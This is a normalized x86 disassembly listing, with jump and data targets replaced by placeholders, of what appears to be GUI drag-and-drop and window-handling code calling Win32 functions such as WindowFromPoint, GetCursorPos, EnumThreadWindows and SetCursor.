call sub_44dd1c
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44dd1c
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x4c ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44de00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44de6c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44e2b4
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44d2f4
mov esi eax
test esi esi
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4585f8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4585f8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4585f8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbc
call sub_40484c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44de00
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4585f8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x94 ]
call sub_4585f8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44e008
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4585f8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4585f8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_44e04c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xbc ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_44d830
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44de6c
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_419898
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4585f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44e008
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbb
call sub_40484c
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbc
call sub_40484c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44d778
sub_44e1a0
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4198f4
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41978c
mov edx esi
mov eax [ rw-data ]
call sub_419740
jmp r-xdata
sub_44e1fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44e254
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4059dc
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_44d2c0
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44e2b4
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44e254
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44e2e0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_44e04c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44e2b4
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44e1fc
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4585f8
mov [ esi ] eax
sub_44e330
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0x10
push eax
mov eax [ rw-data ]
mov eax [ eax + 0xc ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44e1fc
cmp eax 0x1
sbb eax eax
inc eax
sub_44e36c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ esi + 0x1db ] 0x0
je r-xdata
cmp [ esi + 0x1ac ] 0x0
je r-xdata
mov eax esi
call sub_456fac
test eax eax
je r-xdata
mov eax esi
call sub_456fac
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0x10
xor edx edx
call sub_44ee0c
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x1ac ]
call sub_419898
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x1ac ]
call sub_4198f4
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx edi
mov eax esi
call sub_456fc0
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_44e40c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
movzx ecx [ eax + 0x8f ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_44e2e0
mov esi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ ebx ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8f ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ ebx + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_45a180
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x14 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov al 0x1
call sub_44e330
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov al 0x2
call sub_44e330
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0x4 ]
mov edi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
call sub_4503d4
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x1c ] edx
mov eax [ rw-data ]
mov [ eax + 0x8 ] esi
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0xc ] edx
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x14 ] edx
xor eax eax
call sub_44e330
cmp [ rw-data ] 0x0
je r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_444280
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45a15c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ esi + 0x51 ] 0x20
jne r-xdata
call sub_44e36c
mov edi eax
mov eax [ rw-data ]
mov [ eax + 0x60 ] edi
test edi edi
jne r-xdata
mov edx [ ebx + 0x4 ]
push edx
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
xchg edx eax
mov si 0xffe7
call sub_40484c
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ rw-data ]
call sub_45a27c
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
call sub_45a180
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax edi
call sub_4503d4
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffd8
call sub_40484c
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
mov eax [ rw-data ]
lea edx [ eax + 0x18 ]
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov si 0xffd8
call sub_40484c
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45a2f0
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_444280
push eax
call SetCursor
mov ebx [ rw-data ]
lea edx [ ebx + 0x64 ]
lea eax [ ebx + 0x4c ]
mov ecx 0x10
call sub_409954
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44e6f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x8 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
mov edx [ rw-data ]
mov [ eax + 0x14 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44d8d4
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x4c ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x28 ] ecx
mov [ edx + 0x2c ] ecx
mov edi [ edx + 0x10 ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x28 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_45a180
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov ecx esi
mov edi [ ecx + 0x14 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x30 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_44e40c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_44e864
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_44ea09
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x8f ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40484c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40484c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44dc08
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44e6f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44daf8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax esi
call sub_4585f8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_418420
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_450324
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x50 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x40 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x4c ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_418420
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x58 ] edx
sub_44ea28
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
mov si 0xffbd
call sub_40484c
mov ebx eax
sub_44ea9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x5 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44edb1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44ed3f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x1
mov eax [ rw-data ]
movzx edx [ ebp - 0x1 ]
mov [ eax + 0x20 ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44d91c
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_404800
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x8 ] 0x0
sete al
mov [ ebx + 0x74 ] al
mov eax [ rw-data ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x11 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xd ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0x11 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0xd ] edx
jmp r-xdata
mov [ ebp - 0x9 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
jne r-xdata
push ebp
call sub_44ea28
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
call sub_44e330
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_45a2f0
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed46
mov eax [ rw-data ]
call sub_404650
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_43bd90
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x0
mov eax [ ebp - 0xd ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x11 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_451b4c
jmp r-xdata
mov edx [ eax + 0x268 ]
cmp edx [ ebx + 0x40 ]
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_44ece3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
push edx
mov edx [ rw-data ]
add edx 0x10
push edx
mov edx [ rw-data ]
mov edx [ edx + 0xc ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44e1fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
xor edx edx
mov [ ebp - 0x11 ] edx
xor edx edx
mov [ ebp - 0xd ] edx
xor edx edx
call sub_440ad0
retn
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
sub_44ed46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4047dc
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
sub_44edd8
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44d2f4
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44ee0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44edd8
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebp
call sub_4503d4
lea edx [ esp + 0x8 ]
mov ecx ebx
mov eax ebp
call sub_455430
test eax eax
je r-xdata
mov esi eax
sub_44ee58
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_419740
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx ] eax
sub_44ee80
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4199dc
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_404650
xor eax eax
mov [ ebx ] eax
sub_44eea0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
